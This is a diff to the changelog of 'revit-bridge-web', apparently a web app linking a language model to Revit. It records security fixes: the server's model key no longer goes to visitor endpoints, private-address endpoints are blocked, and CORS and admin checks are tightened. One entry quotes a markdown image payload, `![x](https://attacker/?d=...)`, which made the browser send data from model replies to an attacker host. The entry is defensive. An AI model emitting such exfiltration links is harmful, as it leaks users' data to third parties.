@@ -9,6 +9,9 @@ All notable changes to `revit-bridge-web` are recorded here. The format follows
 Upgrading: the host needs `revit-bridge>=0.6,<0.7` (`uv sync`, or rebuild the image). The system
 prompt changes (below); questions in the `spec` event may carry `kind` and `blocks`, and a value
 `reconcile` cannot find now also comes as a question. Event names and shapes are unchanged.
+Set `ADMIN_PASSWORD` to keep changing capability packs from the web UI (see *Security*). If your
+`.env` was copied from an older `.env.example`, delete its `FORWARDED_ALLOW_IPS=127.0.0.1` line
+when the port is published on loopback behind a proxy on the Docker host (see *Fixed*).
 
 ### Security
 
@@ -24,6 +27,21 @@ prompt changes (below); questions in the `spec` event may carry `kind` and `bloc
   *Save as pack* stays off, until the admin password is entered on the Connect page; a host
   without `ADMIN_PASSWORD` cannot change packs through the web UI. The model's tools never
   could (it has no writing tool; a test keeps it so).
+- The server's model key no longer leaves for a visitor's endpoint. A request with only
+  `X-LLM-Base-Url` used to go there with `LLM_API_KEY` in its `Authorization` header. The key
+  now only ever goes to `LLM_BASE_URL`: a request that names its own base URL must send
+  `X-LLM-Key` too (400 otherwise, nothing sent); a visitor's key or model name alone still uses
+  the server's endpoint, as documented. `/config.json` reports `serverModel` only when
+  `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
+- A browser-supplied model endpoint must be on a public address: a literal loopback, private,
+  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6 included), or a
+  name that resolves to one, is refused with 400 before anything is sent. `LLM_ALLOW_HTTP=1`
+  lifts this along with the https rule (a model on the operator's own network);
+  `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
+  DNS rebinding.
+- Markdown from the model (task page) and from skill files (Capabilities page) renders no
+  images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
+  An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.
 
 ### Added
 
@@ -188,6 +206,38 @@ prompt changes (below); questions in the `spec` event may carry `kind` and `bloc
 
 ### Fixed
 
+- Behind the documented setup (port published on loopback, a reverse proxy on the Docker host)
+  every visitor shared one address for the rate limits and the logs: requests reach the
+  container from the Docker bridge gateway, whose `X-Forwarded-For` was not trusted, so the
+  pairing redeem limit (10 a minute) applied to the whole host. The image now trusts
+  `127.0.0.1,172.16.0.0/12` (`FORWARDED_ALLOW_IPS`; an explicit value still wins, and outside a
+  container the default stays `127.0.0.1`). With `BIND_ADDRESS` not loopback, set
+  `FORWARDED_ALLOW_IPS` to the proxy's address, or to `127.0.0.1` with no proxy.
+- The container no longer turns "unhealthy" when `.env` sets `HTTP_PROXY` for model calls: the
+  healthcheck bypasses proxies.
+- A malformed `X-LLM-Base-Url` (`https://[::1`, a port out of range) is a 400, not a 500.
+- `GET /%00` (a NUL byte in a path the SPA fallback looks up) serves the SPA instead of a 500,
+  and an unknown `GET /api/...` is a JSON 404 `{error: "not_found", message}` instead of the
+  SPA page with 200. Real routes, `/config.json`, `/health` and the build's files are unchanged.
+- `CORS_ORIGINS="*"` no longer allows credentials (the middleware echoed any origin back with
+  credentials allowed); an explicit origin list keeps them.
+- `GET` and `DELETE /api/v1/bridge/devices/{id}` answer an unknown id with the same 403
+  `invalid_device_key` as a wrong key, so a browser cannot probe which devices exist; with the
+  admin password an unknown id is still 404. Every admin check compares `X-Admin-Token` in
+  constant time (the device routes used `==`).
+- Requests for one device no longer queue without bound behind a long one (a confirmation
+  dialog holds a device up to three minutes): a request waits for its turn at most its own
+  timeout and at most 16 wait at once, then fails as `revit_unreachable` (503) with nothing
+  sent and no token consumed. The add-in's WebSocket handshake is limited to 60 attempts a
+  minute per address, refused before the upgrade so the close codes 4001/4002/4003 keep their
+  meaning.
+- Growth while the host runs: interaction logs older than 90 days are purged daily, not only at
+  startup; at most 300 chat sessions are kept (the one idle the longest goes first); an
+  `execution` report over 65,536 characters of JSON is refused with 422 `invalid_args`; one
+  model call ends after 600 s even when the endpoint keeps trickling bytes.
+- Skills: a very long name is cut to a 120-byte id instead of failing with 500, a longer id is
+  404, a skill file is replaced whole or not at all (temporary file, then rename), and a file
+  that is not UTF-8 reads as absent (404, as the list already skipped it) instead of a 500.
 - A round that offers the model no tools (`bridge: false`, or the last round of a turn) no
   longer runs `tool_calls` the model returns anyway: they are logged (`backend.chat`) and
   dropped, and the round ends with the model's text, or an empty assistant message.
